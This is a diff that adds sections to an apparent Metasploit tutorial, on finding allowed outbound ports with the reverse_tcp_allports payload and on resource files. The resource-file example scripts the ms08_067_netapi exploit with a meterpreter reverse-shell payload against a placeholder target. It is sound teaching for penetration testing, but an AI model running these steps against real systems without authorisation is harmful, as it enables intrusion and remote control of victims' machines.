@@ -182,11 +182,38 @@ Systems and networks are generally becoming better protected, and basic exploits
 - **Msf> set and unset**: some parameters shown by the previous command (*show options*) are required. We can use the command *set* to set an option, and *unset* to unset it.
 - **Msf> setg and unsetg**: these commands are used to set/unset a global parameter in msfconsole. It is useful for variables that don't often change, like our IP address for example (LHOST). After setting general options with *setg*, we can use the command **save** to save them for the next time we use msfconsole. This can be done anytime and anywhere in msfconsole (within or outside of a module), and the configuration is saved in *root/.msf3/config*.
 - **Msf> show payloads**: we saw that payloads are pieces of code sent to the target. As for *show options*, when we use this command within a module, it shows the available payloads for that module. For Microsoft Windows exploits, a payload can be as simple as a command prompt on the target, and as complex as a complete GUI on the target system. After selecting a payload (with *set*), we can use the command *show options* again to see the new parameters. In reverse payloads, the connection is done by the target machine to the attacker; we must specify our IP and a port to which it will connect. We can use this technique to bypass a NAT or a firewall.
-- **Msf> show targets**: modules often list potentially vulnerable targets, based on their version, language and security implementations. It is generally a good idea to identify the right exploit instead of using the option *Automatic targetting*. Therefore, it is important to identify the OS of the target.
+- **Msf> show targets**: modules often list potentially vulnerable targets, based on their version, language and security implementations. It is generally a good idea to identify the right exploit instead of using the option *Automatic targetting*. Therefore, it is important to identify the OS of the target; if the exploits uses an overflow against the wrong OS, it can do severe damage.
 - **Msf> info**: called from within a module, this command gives additional on this latter. We can also use this command outside of a module, followed by the name of a module.
 
 
+## Port bruteforcing
+{:style="color:DarkRed; font-size: 170%;"}
+
+Until now, we assumed that the reverse port was always opened. However, most companies block outgoing connections, except on a few specific ports. It can be hard to determine the ports that allow an outgoing connection.
+
+We can easily guess that port 443 (HTTPS) will not be inspected and allows an outgoing TCP connection. We can also suppose that ports 23 (Telnet), 21 (FTP), 22 (SSH) and 80 (HTTP) are authorized. 
+
+However, Metasploit has a payload defined to look for open ports. This latter will try all the available ports until it finds an open process. It is the payload *windows/meterpreter/reverse_tcp_allports* (we can find it with the command *search ports*). We launch the exploit without specifying LPORT; it will automatically open a meterpreter session on an outgoing port.
+
+## Resource files
+{:style="color:DarkRed; font-size: 170%;"}
+
+Resource files are script files that allow to automate commands in msfconsole. They contain a list of commands that are executed sequentially by msfconsole.
+
+These files can be loaded into msfconsole with the command *resource*. For example, we can use a SMB exploit in a new resource file called *autoexploit.rc*: We define a payload, the attack and the target's IP in this file (so we don't have to do it manually when we try the exploit). We would:
+
+~~~~
+echo use exploit/windows/smb/ms08_067_netapi > autoexploit.rc
+echo set RHOST *target IP* >> autoexploit.rc
+echo set PAYLOAD windows/meterpreter/reverse_tcp >> autoexploit.rc
+echo set LHOST *my IP* >> autoexploit.rc
+echo exploit >> autoexploit.rc
+~~~~~
+
+We would then start Metasploit with *msfconsole* and launch the exploit with *resource autoexploit.rc*.
+
 # Meterpreter : presentation of the post exploitation swiss knife
+
 
 # Avoid detection : ideas behind AVs evasion
 
